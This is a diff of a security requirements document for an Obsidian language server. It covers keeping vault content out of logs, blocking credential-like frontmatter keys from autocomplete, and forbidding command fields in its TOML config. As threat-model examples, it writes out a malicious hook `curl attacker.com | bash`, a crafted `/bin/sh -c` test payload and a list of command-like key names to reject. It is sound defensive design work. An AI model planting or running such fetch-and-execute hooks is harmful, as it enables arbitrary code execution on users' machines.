@@ -20,6 +20,7 @@ aliases:
 **Ambition:** A developer enabling debug logging to troubleshoot an LSP issue should not find the contents of their personal journal or medical notes in a log file. Log files may be: shared with the project for bug reports, captured by log aggregation tools, stored in world-readable locations, or accidentally committed to version control. Any log message that includes document content (even a snippet in an error message like "Failed to parse: `---\npassword: hunter2\n---`") is a potential disclosure channel. The constraint is absolute: content never appears in logs, regardless of log level.
 **Scale:** Percentage of log entries generated during a vault indexing and LSP operation session that contain any substring matching actual content from vault document files (as opposed to file paths or metadata).
 **Meter:**
+
 1. Create a test vault with known sensitive content in documents (e.g., frontmatter containing `password: test-secret-value`).
 2. Run the server with maximum logging verbosity against the test vault.
 3. Capture all log output.
@@ -38,6 +39,7 @@ aliases:
 **Ambition:** Obsidian users sometimes store credentials in frontmatter for use with plugins (e.g., `api_key: sk-proj-XXXXX` for an AI plugin, or `password: mypassword` for an HTTP auth header in a Dataview query). The VaultIndex ingests all frontmatter values as alias candidates and completion sources. If the completion handler surfaces these values as completion candidates in `textDocument/completion`, they appear in the editor's autocomplete UI where they could be accidentally pasted, captured by screen recording, or visible over the shoulder. The blocked-key list prevents this class of values from entering the completion candidate pool at all.
 **Scale:** Percentage of completion requests that return candidates derived from frontmatter values under blocked key names.
 **Meter:**
+
 1. Create a test vault document with frontmatter containing: `password: secret123`, `api_key: sk-test-abc`, `aliases: [safe-alias]`.
 2. Trigger `textDocument/completion` in the context of a wiki-link (`[[`).
 3. Inspect the completion candidate list.
@@ -57,6 +59,7 @@ aliases:
 **Ambition:** The 2026 OpenCode vulnerability demonstrated that allowing a repository's configuration file to specify which LSP server binary to launch creates an arbitrary code execution vector. A malicious vault's `.flavor-grenade.toml` could specify a `[hooks] on_save = "curl attacker.com | bash"` field that executes arbitrary commands whenever the server processes a file save event. The fix is architectural: the server's configuration schema must simply not include any field type that represents a command, script path, or executable. This is enforced by schema validation — any TOML key in a command-execution position is rejected. If the server ever needs to run external tools, that capability must be introduced via a new ADR with explicit user-consent mechanisms (e.g., `window/showMessageRequest` prompting the user to allow execution of a specific binary).
 **Scale:** Boolean — the `.flavor-grenade.toml` schema contains no fields of type "command", "executable", "script", or "shell". Verified by schema inspection and by attempting to add a command field via a crafted TOML file.
 **Meter:**
+
 1. Inspect the TOML schema definition for `.flavor-grenade.toml` in `src/`.
 2. Verify no field accepts a string value intended to be executed as a command (search for field names: `command`, `cmd`, `exec`, `script`, `hook`, `run`, `shell`, `binary`, `path` in executable context).
 3. Create a test `.flavor-grenade.toml` with a crafted `[hooks] on_index = "/bin/sh -c 'touch /tmp/pwned'"`.
